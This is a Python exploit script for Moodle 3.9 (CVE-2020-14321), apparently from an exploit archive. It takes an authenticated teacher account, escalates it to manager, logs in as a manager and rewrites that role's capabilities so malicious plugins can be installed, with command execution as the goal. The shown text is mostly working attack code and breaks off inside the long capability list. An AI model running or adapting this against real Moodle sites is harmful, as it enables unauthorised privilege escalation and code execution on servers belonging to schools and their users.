# Exploit Title: Moodle 3.9 - Remote Code Execution (RCE) (Authenticated)
# Date: 12-05-2021
# Exploit Author: lanz
# Vendor Homepage: https://moodle.org/
# Version: Moodle 3.9
# Tested on: FreeBSD

#!/usr/bin/python3

## Moodle 3.9 - RCE (Authenticated as teacher)
## Based on PoC and Payload to assign full permissions to manager rol:
##   * https://github.com/HoangKien1020/CVE-2020-14321

## Repository: https://github.com/lanzt/CVE-2020-14321/blob/main/CVE-2020-14321_RCE.py

import string, random
import requests, re
import argparse
import base64
import signal
import time
from pwn import *

class Color:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

def def_handler(sig, frame):
    print(Color.RED + "\n[!] 3xIt1ngG...\n")
    exit(1)

signal.signal(signal.SIGINT, def_handler)

banner = base64.b64decode("IF9fICAgICBfXyAgICAgX18gICBfXyAgX18gICBfXyAgICAgICAgICAgICAgX18gIF9fICAgICAKLyAgXCAgL3xfICBfXyAgIF8pIC8gIFwgIF8pIC8gIFwgX18gIC98IHxfX3wgIF8pICBfKSAvfCAKXF9fIFwvIHxfXyAgICAgL19fIFxfXy8gL19fIFxfXy8gICAgICB8ICAgIHwgX18pIC9fXyAgfCDigKIgYnkgbGFuegoKTW9vZGxlIDMuOSAtIFJlbW90ZSBDb21tYW5kIEV4ZWN1dGlvbiAoQXV0aGVudGljYXRlZCBhcyB0ZWFjaGVyKQpDb3Vyc2UgZW5yb2xtZW50cyBhbGxvd2VkIHByaXZpbGVnZSBlc2NhbGF0aW9uIGZyb20gdGVhY2hlciByb2xlIGludG8gbWFuYWdlciByb2xlIHRvIFJDRQogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIA==").decode()

print(Color.BLUE + banner + Color.END)

def usagemybro():
    fNombre = os.path.basename(__file__)
    ussage = fNombre + ' [-h] [-u USERNAME] [-p PASSWORD] [-idm ID_MANAGER] [-idc ID_COURSE] [-c COMMAND] [--cookie TEACHER_COOKIE] url\n\n'
    ussage += '[+] Examples:\n'
    ussage += '\t' + fNombre + ' http://moodle.site.com/moodle -u teacher_name -p teacher_pass\n'
    ussage += '\t' + fNombre + " http://moodle.site.com/moodle --cookie thisistheffcookieofmyteaaacher\n"
    return ussage

def arguments():
    parse = argparse.ArgumentParser(usage=usagemybro())
    parse.add_argument(dest='url', type=str, help='URL Moodle site')
    parse.add_argument('-u', dest='username', type=str, default='lanz', help='Teacher username, default: lanz')
    parse.add_argument('-p', dest='password', type=str, default='Lanz123$!', help='Teacher password, default: Lanz123$!')
    parse.add_argument('-idm', dest='id_manager', type=str, default='25', help='Manager user ID, default: 25')
    parse.add_argument('-idc', dest='id_course', type=str, default='5', help='Course ID valid to enrol yourself, default: 5')
    parse.add_argument('-c', dest='command', type=str, default='whoami', help='Command to execute, default: whoami')
    parse.add_argument('--cookie', dest='teacher_cookie', type=str, default='', help='Teacher cookie (if you don\'t have valid credentials)')
    return parse.parse_args()

def login(url, username, password, course_id, teacher_cookie):
    '''
    Sign in on site, with creds or with cookie
    '''

    p1 = log.progress("Login on site")

    session = requests.Session()
    r = session.get(url + '/login/index.php')

    # Sign in with teacher cookie
    if teacher_cookie != "":
        p1.status("Cookie " + Color.BLUE + "MoodleSession:" + teacher_cookie + Color.END)
        time.sleep(2)

        # In case the URL format is: http://moodle.site.com/moodle
        cookie_domain = url.split('/')[2] # moodle.site.com
        cookie_path = "/%s/" % (url.split('/')[3]) # /moodle/
        session.cookies.set('MoodleSession', teacher_cookie, domain=cookie_domain, path=cookie_path)

        r = session.get(url + '/user/index.php', params={"id":course_id})
        try:
            re.findall(r'class="usertext mr-1">(.*?)<', r.text)[0]
        except IndexError:
            p1.failure(Color.RED + "✘" + Color.END)
            print(Color.RED + "\nInvalid cookie, try again, verify cookie domain and cookie path or simply change all.\n")
            exit(1)

        id_user = re.findall(r'id="nav-notification-popover-container" data-userid="(.*?)"', r.text)[0]
        sess_key = re.findall(r'"sesskey":"(.*?)"', r.text)[0]

        p1.success(Color.BLUE + "MoodleSession:" + teacher_cookie + Color.END + Color.YELLOW +  " ✓" + Color.END)
        time.sleep(1)

    # Sign in with teacher credentials
    elif username and password != "":
        p1.status("Creds " + Color.BLUE + username + ":" + password + Color.END)
        time.sleep(2)

        login_token = re.findall(r'name="logintoken" value="(.*?)"', r.text)[0]

        data_post = {
            "anchor" : "",
            "logintoken" : login_token,
            "username" : username,
            "password" : password
        }

        r = session.post(url + '/login/index.php', data=data_post)
        if "Recently accessed courses" not in r.text:
            p1.failure(Color.RED + "✘" + Color.END)
            print(Color.RED + "\nInvalid credentials.\n")
            exit(1)

        id_user = re.findall(r'id="nav-notification-popover-container" data-userid="(.*?)"', r.text)[0]
        sess_key = re.findall(r'"sesskey":"(.*?)"', r.text)[0]

        p1.success(Color.BLUE + username + ":" + password + Color.END + Color.YELLOW + " ✓" + Color.END)
        time.sleep(1)

    else:
        print(Color.RED + "\nUse valid credentials or valid cookie\n")
        exit(1)

    return session, id_user, sess_key

def enrol2rce(session, url, id_manager, username, course_id, teacher_cookie, command):
    '''
    Assign rol manager to teacher and manager account in the course.
    '''

    p4 = log.progress("Updating roles to move on manager accout")
    time.sleep(1)

    r = session.get(url + '/user/index.php', params={"id":course_id})
    try:
        teacher_user = re.findall(r'class="usertext mr-1">(.*?)<', r.text)[0]
    except IndexError:
        p4.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nInvalid cookie, try again, verify cookie domain and cookie path or simply change all.\n")
        exit(1)

    p4.status("Teacher " + Color.BLUE + teacher_user + Color.END)
    time.sleep(1)

    id_user = re.findall(r'id="nav-notification-popover-container" data-userid="(.*?)"', r.text)[0]
    sess_key = re.findall(r'"sesskey":"(.*?)"', r.text)[0]

    session = update_rol(session, url, sess_key, course_id, id_user)
    session = update_rol(session, url, sess_key, course_id, id_manager)

    data_get = {
        "id" : course_id,
        "user" : id_manager,
        "sesskey" : sess_key
    }

    r = session.get(url + '/course/loginas.php', params=data_get)
    if "You are logged in as" not in r.text:
        p4.failure(Color.RED + "✘" + Color.END)
        print(Color.RED + "\nError trying to move on manager account. Validate credentials (or cookie).\n")
        exit(1)

    p4.success(Color.YELLOW + "✓" + Color.END)
    time.sleep(1)

    sess_key = re.findall(r'"sesskey":"(.*?)"', r.text)[0]

    # Updating rol manager to enable install plugins
    session, sess_key = update_rol_manager(session, url, sess_key)

    # Upload malicious zip file
    zipb64_up(session, url, sess_key, teacher_user, course_id)

    # RCE on system
    moodle_RCE(url, command)

def update_rol(session, url, sess_key, course_id, id_user):
    '''
    Updating teacher rol to enable he update other users
    '''

    data_get = {
        "mform_showmore_main" : "0",
        "id" : course_id,
        "action" : "enrol",
        "enrolid" : "10",
        "sesskey" : sess_key,
        "_qf__enrol_manual_enrol_users_form" : "1",
        "mform_showmore_id_main" : "0",
        "userlist[]" : id_user,
        "roletoassign" : "1",
        "startdate" : "4",
        "duration" : ""
    }

    r = session.get(url + '/enrol/manual/ajax.php', params=data_get)
    return session

def update_rol_manager(session, url, sess_key):
    '''
    Updating rol manager to enable install plugins
        * Extracted from: https://github.com/HoangKien1020/CVE-2020-14321
    '''

    p6 = log.progress("Updating rol manager to enable install plugins")
    time.sleep(1)

    data_get = {
        "action":"edit",
        "roleid":"1"
    }

    random_desc = ''.join(random.choice(string.ascii_lowercase) for i in range(15))

    # Headache part :P
    data_post = [('sesskey',sess_key),('return','manage'),('resettype','none'),('shortname','manager'),('name',''),('description',random_desc),('archetype','manager'),('contextlevel10','0'),('contextlevel10','1'),('contextlevel30','0'),('contextlevel30','1'),('contextlevel40','0'),('contextlevel40','1'),('contextlevel50','0'),('contextlevel50','1'),('contextlevel70','0'),('contextlevel70','1'),('contextlevel80','0'),('contextlevel80','1'),('allowassign[]',''),('allowassign[]','1'),('allowassign[]','2'),('allowassign[]','3'),('allowassign[]','4'),('allowassign[]','5'),('allowassign[]','6'),('allowassign[]','7'),('allowassign[]','8'),('allowoverride[]',''),('allowoverride[]','1'),('allowoverride[]','2'),('allowoverride[]','3'),('allowoverride[]','4'),('allowoverride[]','5'),('allowoverride[]','6'),('allowoverride[]','7'),('allowoverride[]','8'),('allowswitch[]',''),('allowswitch[]','1'),('allowswitch[]','2'),('allowswitch[]','3'),('allowswitch[]','4'),('allowswitch[]','5'),('allowswitch[]','6'),('allowswitch[]','7'),('allowswitch[]','8'),('allowview[]',''),('allowview[]','1'),('allowview[]','2'),('allowview[]','3'),('allowview[]','4'),('allowview[]','5'),('allowview[]','6'),('allowview[]','7'),('allowview[]','8'),('block/admin_bookmarks:myaddinstance','1'),('block/badges:myaddinstance','1'),('block/calendar_month:myaddinstance','1'),('block/calendar_upcoming:myaddinstance','1'),('block/comments:myaddinstance','1'),('block/course_list:myaddinstance','1'),('block/globalsearch:myaddinstance','1'),('block/glossary_random:myaddinstance','1'),('block/html:myaddinstance','1'),('block/lp:addinstance','1'),('block/lp:myaddinstance','1'),('block/mentees:myaddinstance','1'),('block/mnet_hosts:myaddinstance','1'),('block/myoverview:myaddinstance','1'),('block/myprofile:myaddinstance','1'),('block/navigation:myaddinstance','1'),('block/news_items:myaddinstance','1'),('block/online_users:myaddinstance','1'),('block/private_files:myaddinstance','1'),('block/recentlyaccessedcourses:myaddinstance','1'),('block/recentlyaccesseditems:myaddinstance','1'),('block/rss_client:myaddinstance','1'),('block/settings:myaddinstance','1'),('block/starredcourses:myaddinstance','1'),('block/tags:myaddinstance','1'),('block/timeline:myaddinstance','1'),('enrol/category:synchronised','1'),('message/airnotifier:managedevice','1'),('moodle/analytics:listowninsights','1'),('moodle/analytics:managemodels','1'),('moodle/badges:manageglobalsettings','1'),('moodle/blog:create','1'),('moodle/blog:manageentries','1'),('moodle/blog:manageexternal','1'),('moodle/blog:search','1'),('moodle/blog:view','1'),('moodle/blog:viewdrafts','1'),('moodle/course:configurecustomfields','1'),('moodle/course:recommendactivity','1'),('moodle/grade:managesharedforms','1'),('moodle/grade:sharegradingforms','1'),('moodle/my:configsyspages','1'),('moodle/my:manageblocks','1'),('moodle/portfolio:export','1'),('moodle/question:config','1'),('moodle/restore:createuser','1'),('moodle/role:manage','1'),('moodle/search:query','1'),('moodle/site:config','1'),('moodle/site:configview','1'),('moodle/site:deleteanymessage','1'),('moodle/site:deleteownmessage','1'),('moodle/site:doclinks','1'),('moodle/site:forcelanguage','1'),('moodle/site:maintenanceaccess','1'),('moodle/site:manageallmessaging','1'),('moodle/site:messageanyuser','1'),('moodle/site:mnetlogintoremote','1'),('moodle/site:readallmessages','1'),('moodle/site:sendmessage','1'),('moodle/site:uploadusers','1'),('moodle/site:viewparticipants','1'),('moodle/tag:edit','1'),('moodle/tag:editblocks','1'),('moodle/tag:flag','1'),('moodle/tag:manage','1'),('moodle/user:changeownpassword','1'),('moodle/user:create','1'),('moodle/user:delete','1'),('moodle/user:editownmessageprofile','1'),('moodle/user:editownprofile','1'),('moodle/user:ignoreuserquota','1'),('moodle/user:manageownblocks','1'),('moodle/user:manageownfiles','1'),('moodle/user:managesyspages','1'),('moodle/user:update','1'),('moodle/webservice:createmobiletoken','1'),('moodle/webservice:createtoken','1'),('moodle/webservice:managealltokens','1'),('quizaccess/seb:managetemplates','1'),('report/courseoverview:view','1'),('report/performance:view','1'),('report/questioninstances:view','1'),('report/security:view','1'),('report/status:view','1'),('tool/customlang:edit','1'),('tool/customlang:view','1'),('tool/dataprivacy:managedataregistry','1'),('tool/dataprivacy:managedatarequests','1'),('tool/dataprivacy:requestdeleteforotheruser','1'),('tool/lpmigrate:frameworksmigrate','1'),('tool/monitor:managetool','1'),('tool/policy:accept','1'),('tool/policy:managedocs','1'),('tool/policy:viewacceptances','1'),('tool/uploaduser:uploaduserpictures','1'),('tool/usertours:managetours','1'),('auth/oauth2:managelinkedlogins','1'),('moodle/badges:manageownbadges','1'),('moodle/badges:viewotherbadges','1'),('moodle/competency:evidencedelete','1'),('moodle/competency:plancomment','1'),('moodle/competency:plancommentown','1'),('moodle/competency:planmanage','1'),('moodle/competency:planmanagedraft','1'),('moodle/competency:planmanageown','1'),('moodle/competency:planmanageowndraft','1'),('moodle/competency:planrequestreview','1'),('moodle/competency:planrequestreviewown','1'),('moodle/competency:planreview','1'),('moodle/competency:planview','1'),('moodle/competency:planviewdraft','1'),('moodle/competency:planviewown','1'),('moodle/competency:planviewowndraft','1'),('moodle/competency:usercompetencycomment','1'),('moodle/competency:usercompetencycommentown','1'),('moodle/competency:usercompetencyrequestreview','1'),('moodle/competency:usercompetencyrequestreviewown','1'),('moodle/competency:usercompetencyreview','1'),('moodle/competency:usercompetencyview','1'),('moodle/competency:userevidencemanage','1'),('moodle/competency:userevidencemanageown','0'),('moodle/competency:userevidenceview','1'),('moodle/user:editmessageprofile','1'),('moodle/user:editprofile','1'),('moodle/user:manageblocks','1'),('moodle/user:readuserblogs','1'),('moodle/user:readuserposts','1'),('moodle/user:viewalldetails','1'),('moodle/user:viewlastip','1'),('moodle/user:viewuseractivitiesreport','1'),('report/usersessions:manageownsessions','1'),('tool/dataprivacy:downloadallrequests','1'),('tool/dataprivacy:downloadownrequest','1'),('tool/dataprivacy:makedatadeletionrequestsforchildren','1'),('tool/dataprivacy:makedatarequestsforchildren','1'),('tool/dataprivacy:requestdelete','1'),('tool/policy:acceptbehalf','1'),('moodle/category:manage','1'),('moodle/category:viewcourselist','1'),('moodle/category:viewhiddencategories','1'),('moodle/cohort:assign','1'),('moodle/cohort:manage','1'),('moodle/competency:competencymanage','1'),('moodle/competency:competencyview','1'),('moodle/competency:templatemanage','1'),('moodle/competency:templateview','1'),('moodle/course:create','1'),('moodle/course:request','1'),('moodle/site:approvecourse','1'),('repository/contentbank:accesscoursecategorycontent','1'),('repository/contentbank:accessgeneralcontent','1'),('block/recent_activity:viewaddupdatemodule','1'),('block/recent_activity:viewdeletemodule','1'),('contenttype/h5p:access','1'),('contenttype/h5p:upload','1'),('contenttype/h5p:useeditor','1'),('enrol/category:config','1'),('enrol/cohort:config','1'),('enrol/cohort:unenrol','1'),('enrol/database:config','1'),('enrol/database:unenrol','1'),('enrol/flatfile:manage','1'),('enrol/flatfile:unenrol','1'),('enrol/guest:config','1'),('enrol/imsenterprise:config','1'),('enrol/ldap:manage','1'),('enrol/lti:config','1'),('enrol/lti:unenrol','1'),('enrol/manual:config','1'),('enrol/manual:enrol','1'),('enrol/manual:manage','1'),('enrol/manual:unenrol','1'),('enrol/manual:unenrolself','1'),('enrol/meta:config','1'),('enrol/meta:selectaslinked','1'),('enrol/meta:unenrol','1'),('enrol/mnet:config','1'),('enrol/paypal:config','1'),('enrol/paypal:manage','1'),('enrol/paypal:unenrol','1'),('enrol/paypal:unenrolself','1'),('enrol/self:config','1'),('enrol/self:holdkey','1'),('enrol/self:manage','1'),('enrol/self:unenrol','1'),('enrol/self:unenrolself','1'),('gradeexport/ods:publish','1'),('gradeexport/ods:view','1'),('gradeexport/txt:publish','1'),('gradeexport/txt:view','1'),('gradeexport/xls:publish','1'),('gradeexport/xls:view','1'),('gradeexport/xml:publish','1'),('gradeexport/xml:view','1'),('gradeimport/csv:view','1'),('gradeimport/direct:view','1'),('gradeimport/xml:publish','1'),('gradeimport/xml:view','1'),('gradereport/grader:view','1'),('gradereport/history:view','1'),('gradereport/outcomes:view','1'),('gradereport/overview:view','1'),('gradereport/singleview:view','1'),('gradereport/user:view','1'),('mod/assign:addinstance','1'),('mod/assignment:addinstance','1'),('mod/book:addinstance','1'),('mod/chat:addinstance','1'),('mod/choice:addinstance','1'),('mod/data:addinstance','1'),('mod/feedback:addinstance','1'),('mod/folder:addinstance','1'),('mod/forum:addinstance','1'),('mod/glossary:addinstance','1'),('mod/h5pactivity:addinstance','1'),('mod/imscp:addinstance','1'),('mod/label:addinstance','1'),('mod/lesson:addinstance','1'),('mod/lti:addcoursetool','1'),('mod/lti:addinstance','1'),('mod/lti:addmanualinstance','1'),('mod/lti:addpreconfiguredinstance','1'),('mod/lti:requesttooladd','1'),('mod/page:addinstance','1'),('mod/quiz:addinstance','1'),('mod/resource:addinstance','1'),('mod/scorm:addinstance','1'),('mod/survey:addinstance','1'),('mod/url:addinstance','1'),('mod/wiki:addinstance','1'),('mod/workshop:addinstance','1'),('moodle/analytics:listinsights','1'),('moodle/backup:anonymise','1'),('moodle/backup:backupcourse','1'),('moodle/backup:backupsection','1'),('moodle/backup:backuptargetimport','1'),('moodle/backup:configure','1'),('moodle/backup:downloadfile','1'),('moodle/backup:userinfo','1'),('moodle/badges:awardbadge','1'),('moodle/badges:configurecriteria','1'),('moodle/badges:configuredetails','1'),('moodle/badges:configuremessages','1'),('moodle/badges:createbadge','1'),('moodle/badges:deletebadge','1'),('moodle/badges:earnbadge','1'),('moodle/badges:revokebadge','1'),('moodle/badges:viewawarded','1'),('moodle/badges:viewbadges','1'),('moodle/calendar:manageentries','1'),('moodle/calendar:managegroupentries','1'),('moodle/calendar:manageownentries','1'),('moodle/cohort:view','1'),('moodle/comment:delete','1'),('moodle/comment:post','1'),('moodle/comment:view','1'),('moodle/competency:competencygrade','1'),('moodle/competency:coursecompetencygradable','1'),('moodle/competency:coursecompetencymanage','1'),('moodle/competency:coursecompetencyview','1'),('moodle/contentbank:access','1'),('moodle/contentbank:deleteanycontent','1'),('moodle/contentbank:deleteowncontent','1'),('moodle/contentbank:manageanycontent','1'),('moodle/contentbank:manageowncontent','1'),('moodle/contentbank:upload','1'),('moodle/contentbank:useeditor','1'),('moodle/course:bulkmessaging','1'),('moodle/course:changecategory','1'),('moodle/course:changefullname','1'),('moodle/course:changeidnumber','1'),('moodle/course:changelockedcustomfields','1'),('moodle/course:changeshortname','1'),('moodle/course:changesummary','1'),('moodle/course:creategroupconversations','1'),('moodle/course:delete','1'),('moodle/course:enrolconfig','1'),('moodle/course:enrolreview','1'),('moodle/course:ignorefilesizelimits','1'),('moodle/course:isincompletionreports','1'),('moodle/course:managefiles','1'),('moodle/course:managegroups','1'),('moodle/course:managescales','1'),('moodle/course:markcomplete','1'),('moodle/course:movesections','1'),('moodle/course:overridecompletion','1'),('moodle/course:renameroles','1'),('moodle/course:reset','1'),('moodle/course:reviewotherusers','1'),('moodle/course:sectionvisibility','1'),('moodle/course:setcurrentsection','1'),('moodle/course:setforcedlanguage','1'),('moodle/course:tag','1'),('moodle/course:update','1'),('moodle/course:useremail','1'),('moodle/course:view','1'),('moodle/course:viewhiddencourses','1'),('moodle/course:viewhiddensections','1'),('moodle/course:viewhiddenuserfields','1'),('moodle/course:viewparticipants','1'),('moodle/course:viewscales','1'),('moodle/course:viewsuspendedusers','1'),('moodle/course:visibility','1'),('moodle/filter:manage','1'),('moodle/grade:edit','1'),('moodle/grade:export','1'),('moodle/grade:hide','1'),('moodle/grade:import','1'),('moodle/grade:lock','1'),('moodle/grade:manage','1'),('moodle/grade:managegradingforms','1'),('moodle/grade:manageletters','1'),('moodle/grade:manageoutcomes','1'),('moodle/grade:unlock','1'),('moodle/grade:view','1'),('moodle/grade:viewall','1'),('moodle/grade:viewhidden','1'),('moodle/notes:manage','1'),('moodle/notes:view','1'),('moodle/question:add','1'),('moodle/question:editall','1'),('moodle/question:editmine','1'),('moodle/question:flag','1'),('moodle/question:managecategory','1'),('moodle/question:moveall','1'),('moodle/question:movemine','1'),('moodle/question:tagall','1'),('moodle/question:tagmine','1'),('moodle/question:useall','1'),('moodle/question:usemine','1'),('moodle/question:viewall','1'),('moodle/question:viewmine','1'),('moodle/rating:rate','1'),('moodle/rating:view','1'),('moodle/rating:viewall','1'),('moodle/rating:viewany','1'),('moodle/restore:configure','1'),('moodle/restore:restoreactivity','1'),('moodle/restore:restorecourse','1'),('moodle/restore:restoresection','1'),('moodle/restore:restoretargetimport','1'),('moodle/restore:rolldates','1'),('moodle/restore:uploadfile','1'),('moodle/restore:userinfo','1'),('moodle/restore:viewautomatedfilearea','1'),('moodle/role:assign','1'),('moodle/role:override','1'),('moodle/role:review','1'),('moodle/role:safeoverride','1'),('moodle/role:switchroles','1'),('moodle/site:viewreports','1'),('moodle/user:loginas','1'),('moodle/user:viewdetails','1'),('moodle/user:viewhiddendetails','1'),('report/completion:view','1'),('report/log:view','1'),('report/log:viewtoday','1'),('report/loglive:view','1'),('report/outline:view','1'),('report/outline:viewuserreport','1'),('report/participation:view','1'),('report/progress:view','1'),('report/stats:view','1'),('repository/contentbank:accesscoursecontent','1'),('tool/monitor:managerules','1'),('tool/monitor:subscribe','1'),('tool/recyclebin:deleteitems','1'),('tool/recyclebin:restoreitems','1'),('tool/recyclebin:viewitems','1'),('webservice/rest:use','1'),('webservice/soap:use','1'),('webservice/xmlrpc:use','1'),('atto/h5p:addembed','1'),('atto/recordrtc:recordaudio','1'),('atto/recordrtc:recordvideo','1'),('booktool/exportimscp:export','1'),('booktool/importhtml:import','1'),('booktool/print:print','1'),('forumreport/summary:view','1'),('forumreport/summary:viewall','1'),('mod/assign:editothersubmission','1'),('mod/assign:exportownsubmission','1'),('mod/assign:grade','1'),('mod/assign:grantextension','1'),('mod/assign:manageallocations','1'),('mod/assign:managegrades','1'),('mod/assign:manageoverrides','1'),('mod/assign:receivegradernotifications','1'),('mod/assign:releasegrades','1'),('mod/assign:revealidentities','1'),('mod/assign:reviewgrades','1'),('mod/assign:showhiddengrader','1'),('mod/assign:submit','1'),('mod/assign:view','1'),('mod/assign:viewblinddetails','1'),('mod/assign:viewgrades','1'),('mod/assignment:exportownsubmission','1'),('mod/assignment:grade','1'),('mod/assignment:submit','1'),('mod/assignment:view','1'),('mod/book:edit','1'),('mod/book:read','1'),('mod/book:viewhiddenchapters','1'),('mod/chat:chat','1'),('mod/chat:deletelog','1'),('mod/chat:exportparticipatedsession','1'),('mod/chat:exportsession','1'),('mod/chat:readlog','1'),('mod/chat:view','1'),('mod/choice:choose','1'),('mod/choice:deleteresponses','1'),('mod/choice:downloadresponses','1'),('mod/choice:readresponses','1'),('mod/choice:view','1'),('mod/data:approve','1'),('mod/data:comment','1'),('mod/data:exportallentries','1'),('mod/data:exportentry','1'),('mod/data:exportownentry','1'),('mod/data:exportuserinfo','1'),('mod/data:managecomments','1'),('mod/data:manageentries','1'),('mod/data:managetemplates','1'),('mod/data:manageuserpresets','1'),('mod/data:rate','1'),('mod/data:view','1'),('mod/data:viewallratings','1'),('mod/data:viewalluserpresets','1'),('mod/data:viewanyrating','1'),('mod/data:viewentry','1'),('mod/data:viewrating','1'),('mod/data:writeentry','1'),('mod/feedback:complete','1'),('mod/feedback:createprivatetemplate','1'),('mod/feedback:createpublictemplate','1'),('mod/feedback:deletesubmissions','1'),('mod/feedback:deletetemplate','1'),('mod/feedback:edititems','1'),('mod/feedback:mapcourse','1'),('mod/feedback:receivemail','1'),('mod/feedback:view','1'),('mod/feedback:viewanalysepage','1'),('mod/feedback:viewreports','1'),('mod/folder:managefiles','1'),('mod/folder:view','1'),('mod/forum:addnews','1'),('mod/forum:addquestion','1'),('mod/forum:allowforcesubscribe','1'),('mod/forum:canoverridecutoff','1'),('mod/forum:canoverridediscussionlock','1'),('mod/forum:canposttomygroups','1'),('mod/forum:cantogglefavourite','1'),('mod/forum:createattachment','1'),('mod/forum:deleteanypost','1'),('mod/forum:deleteownpost','1'),('mod/forum:editanypost','1'),('mod/forum:exportdiscussion','1'),('mod/forum:exportforum','1'),('mod/forum:exportownpost','1'),('mod/forum:exportpost','1'),('mod/forum:grade','1'),('mod/forum:managesubscriptions','1'),('mod/forum:movediscussions','1'),('mod/forum:pindiscussions','1'),('mod/forum:postprivatereply','1'),('mod/forum:postwithoutthrottling','1'),('mod/forum:rate','1'),('mod/forum:readprivatereplies','1'),('mod/forum:replynews','1'),('mod/forum:replypost','1'),('mod/forum:splitdiscussions','1'),('mod/forum:startdiscussion','1'),('mod/forum:viewallratings','1'),('mod/forum:viewanyrating','1'),('mod/forum:viewdiscussion','1'),('mod/forum:viewhiddentimedposts','1'),('mod/forum:viewqandawithoutposting','1'),('mod/forum:viewrating','1'),('mod/forum:viewsubscribers','1'),('mod/glossary:approve','1'),('mod/glossary:comment','1'),('mod/glossary:export','1'),('mod/glossary:exportentry','1'),('mod/glossary:exportownentry','1'),('mod/glossary:import','1'),('mod/glossary:managecategories','1'),('mod/glossary:managecomments','1'),('mod/glossary:manageentries','1'),('mod/glossary:rate','1'),('mod/glossary:view','1'),('mod/glossary:viewallratings','1'),('mod/glossary:viewanyrating','1'),('mod/glossary:viewrating','1'),('mod/glossary:write','1'),('mod/h5pactivity:reviewattempts','1'),('mod/h5pactivity:submit','1'),('mod/h5pactivity:view','1'),('mod/imscp:view','1'),('mod/label:view','1'),('mod/lesson:edit','1'),('mod/lesson:grade','1'),('mod/lesson:manage','1'),('mod/lesson:manageoverrides','1'),('mod/lesson:view','1'),('mod/lesson:viewreports','1'),('mod/lti:admin','1'),('mod/lti:manage','1'),('mod/lti:view','1'),('mod/page:view','1'),('mod/quiz:attempt','1'),('mod/quiz:deleteattempts','1'),('mod/quiz:emailconfirmsubmission','1'),('mod/quiz:emailnotifysubmission','1'),('mod/quiz:emailwarnoverdue','1'),('mod/quiz:grade','1'),('mod/quiz:ignoretimelimits','1'),('mod/quiz:manage','1'),('mod/quiz:manageoverrides','1'),('mod/quiz:preview','1'),('mod/quiz:regrade','1'),('mod/quiz:reviewmyattempts','1'),('mod/quiz:view','1'),('mod/quiz:viewreports','1'),('mod/resource:view','1'),('mod/scorm:deleteownresponses','1'),('mod/scorm:deleteresponses','1'),('mod/scorm:savetrack','1'),('mod/scorm:skipview','1'),('mod/scorm:viewreport','1'),('mod/scorm:viewscores','1'),('mod/survey:download','1'),('mod/survey:participate','1'),('mod/survey:readresponses','1'),('mod/url:view','1'),('mod/wiki:createpage','1'),('mod/wiki:editcomment','1'),('mod/wiki:editpage','1'),('mod/wiki:managecomment','1'),('mod/wiki:managefiles','1'),('mod/wiki:managewiki','1'),('mod/wiki:overridelock','1'),('mod/wiki:viewcomment','1'),('mod/wiki:viewpage','1'),('mod/workshop:allocate','1'),('mod/workshop:deletesubmissions','1'),('mod/workshop:editdimensions','1'),('mod/workshop:exportsubmissions','1'),('mod/workshop:ignoredeadlines','1'),('mod/workshop:manageexamples','1'),('mod/workshop:overridegrades','1'),('mod/workshop:peerassess','1'),('mod/workshop:publishsubmissions','1'),('mod/workshop:submit','1'),('mod/workshop:switchphase','1'),('mod/workshop:view','1'),('mod/workshop:viewallassessments','1'),('mod/workshop:viewallsubmissions','1'),('mod/workshop:viewauthornames','1'),('mod/workshop:viewauthorpublished','1'),('mod/workshop:viewpublishedsubmissions','1'),('mod/workshop:viewreviewernames','1'),('moodle/backup:backupactivity','1'),('moodle/competency:coursecompetencyconfigure','1'),('moodle/course:activityvisibility','1'),('moodle/course:ignoreavailabilityrestrictions','1'),('moodle/course:manageactivities','1'),('moodle/course:togglecompletion','1'),('moodle/course:viewhiddenactivities','1'),('moodle/h5p:deploy','1'),('moodle/h5p:setdisplayoptions','1'),('moodle/h5p:updatelibraries','1'),('moodle/site:accessallgroups','1'),('moodle/site:managecontextlocks','1'),('moodle/site:trustcontent','1'),('moodle/site:viewanonymousevents','1'),('moodle/site:viewfullnames','1'),('moodle/site:viewuseridentity','1'),('quiz/grading:viewidnumber','1'),('quiz/grading:viewstudentnames','1'),('quiz/statistics:view','1'),('quizaccess/seb:bypassseb','1'),('quizaccess/seb:manage_filemanager_sebconfigfile','1'),('quizaccess/seb:manage_seb_activateurlfiltering','1'),('quizaccess/seb:manage_seb_allowedbrowserexamkeys','1'),('quizaccess/seb:manage_seb_allowreloadinexam','1'),('quizaccess/seb:manage_seb_allowspellchecking','1'),('quizaccess/seb:manage_seb_allowuserquitseb','1'),('quizaccess/seb:manage_seb_enableaudiocontrol','1'),('quizaccess/seb:manage_seb_expressionsallowed','1'),('quizaccess/seb:manage_seb_expressionsblocked','1'),('quizaccess/seb:manage_seb_filterembeddedcontent','1'),('quizaccess/seb:manage_seb_linkquitseb','1'),('quizaccess/seb:manage_seb_muteonstartup','1'),('quizaccess/seb:manage_seb_quitpassword','1'),('quizaccess/seb:manage_seb_regexallowed','1'),('quizaccess/seb:manage_seb_regexblocked','1'),('quizaccess/seb:manage_seb_requiresafeexambrowser','1'),('quizaccess/seb:manage_seb_showkeyboardlayout','1'),('quizaccess/seb:manage_seb_showreloadbutton','1'),('quizaccess/seb:manage_seb_showsebdownloadlink','1'),('quizaccess/seb:manage_seb_showsebtaskbar','1'),('quizaccess/seb:manage_seb_showtime','1'),('quizaccess/seb:manage_seb_showwificontrol','1'),('quizaccess/seb:manage_seb_templateid','1'),('quizaccess/seb:manage_seb_userconfirmquit','1'),('repository/areafiles:view','1'),('repository/boxnet:view','1'),('repository/contentbank:view','1'),('repository/coursefiles:view','1'),('repository/dropbox:view','1'),('repository/equella:view','1'),('repository/filesystem:view','1'),('repository/flickr:view','1'),('repository/flickr_public:view','1'),('repository/googledocs:view','1'),('repository/local:view','1'),('repository/merlot:view','0'),('repository/nextcloud:view','1'),('repository/onedrive:view','1'),('repository/picasa:view','1'),('repository/recent:view','1'),('repository/s3:view','1'),('repository/skydrive:view','1'),('repository/upload:view','1'),('repository/url:view','1'),('repository/user:view','1'),('repository/webdav:view','1'),('repository/wikimedia:view','1'),('repository/youtube:view','1'),('block/activity_modules:addinstance','1'),('block/activity_results:addinstance','1'),('block/admin_bookmarks:addinstance','1'),('block/badges:addinstance','1'),('block/blog_menu:addinstance','1'),('block/blog_recent:addinstance','1'),('block/blog_tags:addinstance','1'),('block/calendar_month:addinstance','1'),('block/calendar_upcoming:addinstance','1'),('block/comments:addinstance','1'),('block/completionstatus:addinstance','1'),('block/course_list:addinstance','1'),('block/course_summary:addinstance','1'),('block/feedb